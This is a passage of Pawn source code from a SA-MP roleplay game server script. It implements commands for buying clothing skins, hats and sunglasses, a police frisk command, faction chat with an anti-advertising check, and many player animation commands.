	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 11)
		{
			new str[1000];
			mysql_format(SQL, str, sizeof(str), "SELECT * FROM `skinurijucatori` WHERE `playerid`='%d'",PlayerInfo[playerid][pSQLID]);
			new Cache: skinuri = mysql_query(SQL, str);
			new id = 0;
			for(new i = 0; i < 1000; i++) SKINSELECTAT[i][playerid] = 0;
			if(cache_get_row_count() > 0)
			{
				for(new i, j = cache_get_row_count(); i != j; i++)
				{
					id++;
					SKINSELECTAT[id][playerid] = cache_get_field_content_int(i, "Model");
				}
				SKINID[playerid] = 1;
				SelectTextDraw(playerid, 0xFF00000FF);
				CumparaSkin[playerid] = 2;
				SkinuriDulap[playerid] = cache_get_row_count();
				PlayerTextDrawSetString(playerid, SkinTD[7], "Seteaza");
				format(str, sizeof(str), "%d",SKINSELECTAT[1][playerid]);
				PlayerTextDrawSetString(playerid, SkinTD[6], str);
				for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawShow(playerid, SkinTD[i]);
				SetPlayerSkin(playerid, SKINSELECTAT[1][playerid]);
				SetPlayerPos(playerid, 181.7973,-88.0839,1002.0234);
				SetPlayerFacingAngle(playerid, 89.1925);
				SetPlayerVirtualWorld(playerid, playerid+1);
				InterpolateCameraPos(playerid, 175.058425, -90.390228, 1003.113708, 179.074188, -88.466522, 1003.228942, 3000);
				InterpolateCameraLookAt(playerid, 179.234527, -87.642211, 1003.021179, 183.946655, -87.947006, 1002.234436, 3000);
			}
			else SCM(playerid, COLOR_ERROR, "You have clothes in your closet personal.");
			cache_delete(skinuri);
		}
		else return SCM(playerid, COLOR_ERROR, "You're in Clothing Store");
	}	
	else return SCM(playerid, COLOR_ERROR, "You're in Clothing Store");
	return 1;
}
CMD:buyclothes(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 11)
		{
			new id=0;
			SKINID[playerid] = 1;
			new str[1000];
			for(new i = 0; i < 100; i++) IDSKIN[i][playerid] = 0, PRETSKIN[i][playerid] = 0;
			new Cache: rezultate = mysql_query(SQL, "SELECT * FROM `skinuri` ORDER BY `Pret`"); 
			new sumarezultate = cache_get_row_count();
			for(new i = 0; i < sumarezultate; i++)
			{
				id++;
				IDSKIN[id][playerid] = cache_get_field_content_int(i, "Model");
				PRETSKIN[id][playerid] = cache_get_field_content_int(i, "Pret");
			}
			SetPlayerInterior(playerid, 18);
			cache_delete(rezultate);
			if(sumarezultate < 1) return SCM(playerid, COLOR_ERROR, "No clothes sale.");
			Skinuri[playerid] = sumarezultate;
			CumparaSkin[playerid] = 1;
			SelectTextDraw(playerid, 0xFF00000FF);
			PlayerTextDrawSetString(playerid, SkinTD[7], "BUY");
			format(str, sizeof(str), "Price:_$%s",FormatNumber(PRETSKIN[1][playerid]));
			PlayerTextDrawSetString(playerid, SkinTD[6], str);
			for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawShow(playerid, SkinTD[i]);
			SetPlayerSkin(playerid, IDSKIN[1][playerid]);
			SetPlayerPos(playerid, 181.7973,-88.0839,1002.0234);
			SetPlayerFacingAngle(playerid, 89.1925);
			SetPlayerVirtualWorld(playerid, playerid+1);
			InterpolateCameraPos(playerid, 175.058425, -90.390228, 1003.113708, 179.074188, -88.466522, 1003.228942, 3000);
			InterpolateCameraLookAt(playerid, 179.234527, -87.642211, 1003.021179, 183.946655, -87.947006, 1002.234436, 3000);
		}
	}
	return 1;
}
CMD:addskin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid, COLOR_ERROR, "No access to this command.");
	new sqlstr[1000],model,pret;
	if(sscanf(params, "ii", model, pret)) return SCM(playerid, -1, "/addskin [model - id skin] [price]");
	mysql_format(SQL, sqlstr, sizeof(sqlstr), "INSERT INTO skinuri (`Model`,`Pret`) VALUES ('%d','%d')",model,pret);
	mysql_tquery(SQL, sqlstr, "" ,""); 
	SCM(playerid, -1, "Skin has been successfully added.");
	return 1;
}
CMD:puthat(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
   	    if(PlayerInfo[playerid][pHats] != 0)
		{
		    if(Hatss[playerid] == 0)
		    {
		    	new skin,sendername[30],string[256];
		    	GetPlayerName(playerid,sendername,sizeof(sendername));
		    	skin = GetPlayerSkin(playerid);
		    	SetPlayerAttachedObject(playerid, 0, PlayerInfo[playerid][pHats], 2, SkinCaps[skin][0], SkinCaps[skin][1], SkinCaps[skin][2], SkinCaps[skin][3],SkinCaps[skin][4], SkinCaps[skin][5], 1.000000, 1.000000, 1.000000);
		    	Hatss[playerid] = 1;
		    	format(string, sizeof(string), "* %s puts on his hat.", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You already have put a hat.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "You don't have a hat.");
	}
	return 1;
}
CMD:removehat(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
   	    if(Hatss[playerid] == 1)
		{
		    new sendername[30],string[256];
		    GetPlayerName(playerid,sendername,sizeof(sendername));
		    RemovePlayerAttachedObject(playerid, 0);
		    Hatss[playerid] = 0;
		    format(string, sizeof(string), "* %s takes off his hat.", sendername);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "You don't put your hat to remove it.");
	}
	return 1;
}
CMD:putglasses(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
   	    if(PlayerInfo[playerid][pGlasses] != 0)
		{
		    if(Sunglasses[playerid] == 0)
		    {
		    	new skin,sendername[30],string[256];
		    	GetPlayerName(playerid,sendername,sizeof(sendername));
		    	skin = GetPlayerSkin(playerid);
		    	SetPlayerHoldingObject(playerid, PlayerInfo[playerid][pGlasses], 2, SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		    	Sunglasses[playerid] = 1;
		    	format(string, sizeof(string), "* %s puts on his sunglasses.", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You already have put a sunglasses.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "You don't have sunglasses.");
	}
	return 1;
}
CMD:removeglasses(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
   	    if(Sunglasses[playerid] == 1)
		{
		    new sendername[30],string[256];
		    GetPlayerName(playerid,sendername,sizeof(sendername));
		    StopPlayerHoldingObject(playerid);
		    Sunglasses[playerid] = 0;
		    format(string, sizeof(string), "* %s takes off his sunglasses.", sendername);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "You don't put your sunglasses to remove it.");
	}
	return 1;
}
CMD:buyglasses(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 11)
		{
			if(IsPlayerConnected(playerid))
			{
				if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid,COLOR_ERROR,"You don't have $5000.");
				new sunglasses[31];
				sunglasses[0] = 19006;
				sunglasses[1] = 19007;
				sunglasses[2] = 19008;
				sunglasses[3] = 19009;
				sunglasses[4] = 19010;
				sunglasses[5] = 19011;
				sunglasses[6] = 19012;
				sunglasses[7] = 19013;
				sunglasses[8] = 19014;
				sunglasses[9] = 19015;
				sunglasses[10] = 19016;
				sunglasses[11] = 19017;
				sunglasses[12] = 19018;
				sunglasses[13] = 19019;
				sunglasses[14] = 19020;
				sunglasses[15] = 19021;
				sunglasses[16] = 19022;
				sunglasses[17] = 19023;
				sunglasses[18] = 19024;
				sunglasses[19] = 19025;
				sunglasses[20] = 19026;
				sunglasses[21] = 19027;
				sunglasses[22] = 19028;
				sunglasses[23] = 19029;
				sunglasses[24] = 19030;
				sunglasses[25] = 19031;
				sunglasses[26] = 19032;
				sunglasses[27] = 19033;
				sunglasses[28] = 19034;
				sunglasses[29] = 19035;
				ShowModelSelectionMenuEx(playerid, sunglasses, 31, "Select glasses", 1, 14.0, 0.0, -55.0);
			}
		}
	}
	return 1;
}
CMD:buyhat(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 11)
		{
			if(IsPlayerConnected(playerid))
			{
				if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid,COLOR_ERROR,"You don't have $5000.");
				new hats[18];
				hats[0] = 18926;
				hats[1] = 18927;
				hats[2] = 18928;
				hats[3] = 18929;
				hats[4] = 18930;
				hats[5] = 18931;
				hats[6] = 18932;
				hats[7] = 18933;
				hats[8] = 18934;
				hats[9] = 18935;
				hats[10] = 18944;
				hats[11] = 18945;
				hats[12] = 18946;
				hats[13] = 18947;
				hats[14] = 18948;
				hats[15] = 18949;
				hats[16] = 18950;
				hats[17] = 18951;
				ShowModelSelectionMenuEx(playerid, hats, 18, "Select hat", 2, 90.0, 0.0, 90.0);
			}
		}
	}
	return 1;
}
CMD:frisk(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new giveplayerid,sendername[25],giveplayer[25],string[128];
	    if(sscanf(params, "u",giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/frisk <Name/Playerid>");
		if(IsACop(playerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    if (ProxDetectorS(8.0, playerid, giveplayerid))
				{
				    if(giveplayerid == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot Frisk yourself.");
				    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
				    new text1[20], text2[20], text4[20];
				    if(PlayerInfo[giveplayerid][pDrugs] > 0) { text1 = "| Drugs."; } else { text1 = "| Empty Pocket."; }
				    if(PlayerInfo[giveplayerid][pMats] > 0) { text2 = "| Materials."; } else { text2 = "| Empty Pocket."; }
				    if(PlayerInfo[giveplayerid][pPhoneBook] > 0) { text4 = "| Phone Book."; } else { text4 = "| Empty Pocket."; }
				    format(string, sizeof(string), "** Items with {B8DBFF}%s{FFFFFF} **", giveplayer);
			        SendClientMessage(playerid, COLOR_SERVER, string);
			        format(string, sizeof(string), "%s, Grams:%d", text1,PlayerInfo[giveplayerid][pDrugs]);
					SendClientMessage(playerid, 0xFFFFFFAA, string);
					format(string, sizeof(string), "%s, Materials:%d", text2,PlayerInfo[giveplayerid][pMats]);
					SendClientMessage(playerid, 0xFFFFFFAA, string);
					format(string, sizeof(string), "%s.", text4);
					SendClientMessage(playerid, 0xFFFFFFAA, string);
                    new Player_Weapons[13];
                    new Player_Ammos[13];
                    new i;
                    for(i = 1;i <= 12;i++)
                    {
                        GetPlayerWeaponData(giveplayerid,i,Player_Weapons[i],Player_Ammos[i]);
                        if(Player_Weapons[i] != 0)
                        {
	                        new weaponName[256];
	                        GetWeaponName(Player_Weapons[i],weaponName,255);
	                        format(string,255,"{B8DBFF}* %s, Gun:{FFFFFF} %s{B8DBFF}, Ammo:{FFFFFF} %d",giveplayer,weaponName,Player_Ammos[i]);
	                        SendClientMessage(playerid,0xFFFFFFAA,string);
                        }
                    }
					format(string, sizeof(string), "* %s has frisked %s for any illegal items.", sendername ,giveplayer);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
			}
            else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
        else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop.");
	}
    return 1;
}
CMD:f(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[300];
	    if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		new result[250],sendername[25];
    	if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/f <Message>");
		if(FindIP(result)) /// Anti-Reclama
	    {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
			format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /f.", advertiser, playerid, result);
			ABroadCast(COLOR_SERVER,string,1);
	    }
	    for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(result, TLD[i], true) != -1)
			{
				if(strfind(result, "wwww.Magic-Gaming.tk", true) != -1 || strfind(result, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(result, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /f.", advertiser, playerid, result);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		new member = PlayerInfo[playerid][pMember];
		new leader = PlayerInfo[playerid][pLeader];
		if(member == 4 || leader == 4 || member == 5 || leader == 5 || member == 6 || leader == 6 || member == 9 || leader == 9 || member == 10 || leader == 10 || member == 11 || leader == 11 || member == 12 || leader == 12 || member == 13 || leader == 13 || member == 14 || leader == 14 )
		{
			new rtext[64];
			if(PlayerInfo[playerid][pRank] == 1) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1]);
			else if(PlayerInfo[playerid][pRank] == 2) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2]);
			else if(PlayerInfo[playerid][pRank] == 3) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3]);
			else if(PlayerInfo[playerid][pRank] == 4) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4]);
			else if(PlayerInfo[playerid][pRank] == 5) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5]);
			else if(PlayerInfo[playerid][pRank] == 6) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6]);
			else if(PlayerInfo[playerid][pRank] == 7) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7]);
			format(string, sizeof(string),"# %s %s: %s",rtext,sendername,result);
			if(PlayerInfo[playerid][pRank] >= 1 && PlayerInfo[playerid][pRank] <= 6)
			{
				SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_MEMBER, string);
			}
			else if(PlayerInfo[playerid][pRank] == 7)
			{
				SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_LEADER, string);
			}
		}
		else return SendClientMessage(playerid, COLOR_GREY, "Your group data is invalid.");
	}
	return 1;
}
CMD:animlist(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    SendClientMessage(playerid,COLOR_GROVE,"Anim List");
    SendClientMessage(playerid,COLOR_SERVER,"Lifejump : Exhaust : Carlock : Rcarjack1 : Lcarjack1 : Rcarjack2 : Lcarjack2 : Hoodfrisked");
    SendClientMessage(playerid,COLOR_SERVER,"Lightcig : Tapcig : Bat : Lean : Clearanim : Dancing : Box : Lowthrow : Highthrow");
    SendClientMessage(playerid,COLOR_SERVER,"Leftslap : Handsup : Fall : Fallback : Sup : Rap : Push : Akick : Lowbodypush");
    SendClientMessage(playerid,COLOR_SERVER,"Spray : Headbutt : Pee : Koface : Kostomach : Kiss : Rollfall : Lay2 : Hitch");
    SendClientMessage(playerid,COLOR_SERVER,"Beach : Medic : Scratch : Sit : Drunk : Bomb : Getarrested : Laugh : Lookout");
    SendClientMessage(playerid,COLOR_SERVER,"Aim : Crossarms : Lay : Hide : Vomit : Eating : Wave : Shouting : Chant");
    SendClientMessage(playerid,COLOR_SERVER,"Frisked : Exhausted : Injured : Slapass : Deal : Dealstance : Crack : Wank : Gro");
    SendClientMessage(playerid,COLOR_SERVER,"Sit : Chat : Fucku : Taichi : Knife : Basket : JumpWater");
    return 1;
}
CMD:carhand(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    ApplyAnimation(playerid,"CAR","Tap_hand",4.1,0,1,1 ,1,1);
	return 1;
}
CMD:lifejump(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","EV_dive",4.0,0,1,1,1,0);
	return 1;
}
CMD:exhaust(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
	return 1;
}
CMD:rcarjack1(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"PED","CAR_pulloutL_LHS",4.0,0,0,0,0,0);
	return 1;
}
CMD:lcarjack1(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"PED","CAR_pulloutL_RHS",4.0,0,0,0,0,0);
	return 1;
}
CMD:rcarjack2(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"PED","CAR_pullout_LHS",4.0,0,0,0,0,0);
	return 1;
}
CMD:lcarjack2(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"PED","CAR_pullout_RHS",4.0,0,0,0,0,0);
	return 1;
}
CMD:hoodfrisked(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	LoopingAnim(playerid,"POLICE","crm_drgbst_01",4.0,0,1,1,1,0);
	return 1;
}
CMD:lightcig(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"SMOKING","M_smk_in",3.0,0,0,0,0,0);
	return 1;
}
CMD:tapcig(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"SMOKING","M_smk_tap",3.0,0,0,0,0,0);
	return 1;
}
CMD:bat(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	LoopingAnim(playerid,"BASEBALL","Bat_IDLE",4.0,1,1,1,1,0);
	return 1;
}
CMD:lean(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/lean <1-2>");
    switch (test)
    {
	    case 1: LoopingAnim(playerid,"GANGS","leanIDLE",4.0,0,1,1,1,0);
	    case 2: LoopingAnim(playerid,"MISC","Plyrlean_loop",4.0,0,1,1,1,0);
	    default: SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/lean <1-2>");
	}
	return 1;
}
CMD:clearanim(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 1.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:dancing(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dancing <1-7>");
	switch (test)
   	{
	    case 1: LoopingAnim(playerid,"STRIP", "strip_A", 4.1, 1, 1, 1, 1, 1 );
        case 2: LoopingAnim(playerid,"STRIP", "strip_B", 4.1, 1, 1, 1, 1, 1 );
     	case 3: LoopingAnim(playerid,"STRIP", "strip_C", 4.1, 1, 1, 1, 1, 1 );
    	case 4: LoopingAnim(playerid,"STRIP", "strip_D", 4.1, 1, 1, 1, 1, 1 );
    	case 5: LoopingAnim(playerid,"STRIP", "strip_E", 4.1, 1, 1, 1, 1, 1 );
    	case 6: LoopingAnim(playerid,"STRIP", "strip_F", 4.1, 1, 1, 1, 1, 1 );
     	case 7: LoopingAnim(playerid,"STRIP", "strip_G", 4.1, 1, 1, 1, 1, 1 );
     	default: SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dancing <1-7>");
	}
	return 1;
}
CMD:box(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	LoopingAnim(playerid,"GYMNASIUM","GYMshadowbox",4.0,1,1,1,1,0);
	return 1;
}
CMD:lowthrow(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"GRENADE","WEAPON_throwu",3.0,0,0,0,0,0);
	return 1;
}
CMD:highthrow(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"GRENADE","WEAPON_throw",4.0,0,0,0,0,0);
	return 1;
}
CMD:leftslap(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"PED","BIKE_elbowL",4.0,0,0,0,0,0);
	return 1;
}
CMD:handsup(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(arefreeze[playerid] == 1) return SCM(playerid, COLOR_ERROR, "Nu poti folosii animatii cand ai freeze.");
	if(PlayerInfo[playerid][pPaintBallG] > 0) return SCM(playerid,COLOR_SERVER,"{FFF8C6}Command is not currently accessible.");
	{
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
		PlayerHandsup[playerid] = 1;
	}
	return 1;
}
CMD:fall(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","KO_skid_front",4.1,0,1,1,1,0);
	return 1;
}
CMD:fallback(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
